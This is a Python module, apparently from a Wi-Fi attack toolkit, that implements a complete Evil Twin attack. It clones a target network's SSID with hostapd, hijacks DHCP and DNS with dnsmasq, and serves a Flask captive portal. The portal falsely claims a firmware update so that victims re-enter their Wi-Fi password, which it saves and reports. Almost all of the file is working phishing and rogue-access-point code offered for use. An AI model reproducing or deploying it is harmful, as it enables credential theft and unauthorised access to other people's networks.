import subprocess
import os
import time
import signal
from ..core.ui import print_status, print_success, print_error, Colors
from ..core.config import Config

class EvilTwinAttack:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target
        self.rogue_ap_proc = None
        self.dns_proc = None
        self.web_proc = None

    def start(self):
        print_status(f"Starting Evil Twin attack on {self.target.essid}...")
        
        if not self.check_dependencies():
            return

        # 1. Setup Configuration Files
        self.create_configs()
        
        # 2. Setup IP Tables and Routing
        self.setup_network()
        
        try:
            # 3. Start Hostapd
            print_status("Starting Rogue Access Point (hostapd)...")
            self.rogue_ap_proc = subprocess.Popen([
                'hostapd', os.path.join(Config.TEMP_DIR, 'hostapd.conf')
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 4. Start DNSmasq
            print_status("Starting DNS and DHCP services (dnsmasq)...")
            self.dns_proc = subprocess.Popen([
                'dnsmasq', '-C', os.path.join(Config.TEMP_DIR, 'dnsmasq.conf'), '-d'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 5. Start Captive Portal (Simple Python Server)
            print_status("Starting Captive Portal web server...")
            self.start_web_server()
            
            print_success("Evil Twin is LIVE! Waiting for victim to connect and enter password...")
            
            # Monitor for captured password
            while True:
                if os.path.exists(os.path.join(Config.OUTPUT_DIR, "captured_pass.txt")):
                    with open(os.path.join(Config.OUTPUT_DIR, "captured_pass.txt"), "r") as f:
                        password = f.read().strip()
                        print_success(f"VICTIM ENTERED PASSWORD: {password}")
                        return password
                time.sleep(2)
                
        except KeyboardInterrupt:
            self.stop()

    def create_configs(self):
        # Hostapd config
        hostapd_conf = f"""
interface={self.interface}
driver=nl80211
ssid={self.target.essid}
hw_mode=g
channel={self.target.channel}
auth_algs=1
wmm_enabled=0
"""
        with open(os.path.join(Config.TEMP_DIR, 'hostapd.conf'), 'w') as f:
            f.write(hostapd_conf)
            
        # Dnsmasq config
        dnsmasq_conf = f"""
interface={self.interface}
dhcp-range=192.168.1.10,192.168.1.100,8h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
"""
        with open(os.path.join(Config.TEMP_DIR, 'dnsmasq.conf'), 'w') as f:
            f.write(dnsmasq_conf)

    def setup_network(self):
        subprocess.run(['ifconfig', self.interface, 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
        subprocess.run(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])

    def start_web_server(self):
        # Create a simple captive portal script
        portal_script = f"""
from flask import Flask, request, redirect
app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <html>
    <head><title>WiFi Authentication Required</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
        <h2>WiFi Login Required</h2>
        <p>A firmware update was installed. Please re-enter your WiFi password to continue.</p>
        <form action="/login" method="post">
            Password: <input type="password" name="password"><br><br>
            <input type="submit" value="Connect">
        </form>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    with open('{os.path.join(Config.OUTPUT_DIR, "captured_pass.txt")}', 'w') as f:
        f.write(password)
    return "<h1>Authentication Successful. Your internet will be restored shortly.</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
"""
        with open(os.path.join(Config.TEMP_DIR, 'portal.py'), 'w') as f:
            f.write(portal_script)
            
        self.web_proc = subprocess.Popen(['python3', os.path.join(Config.TEMP_DIR, 'portal.py')], 
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop(self):
        print_status("Shutting down Evil Twin...")
        if self.rogue_ap_proc: self.rogue_ap_proc.terminate()
        if self.dns_proc: self.dns_proc.terminate()
        if self.web_proc: self.web_proc.terminate()
        subprocess.run(['nmcli', 'device', 'set', self.interface, 'managed', 'yes'], stdout=subprocess.DEVNULL)

    def check_dependencies(self):
        import shutil
        deps = ['hostapd', 'dnsmasq', 'python3']
        for dep in deps:
            if not shutil.which(dep):
                print_error(f"Missing dependency: {dep}")
                return False
        return True
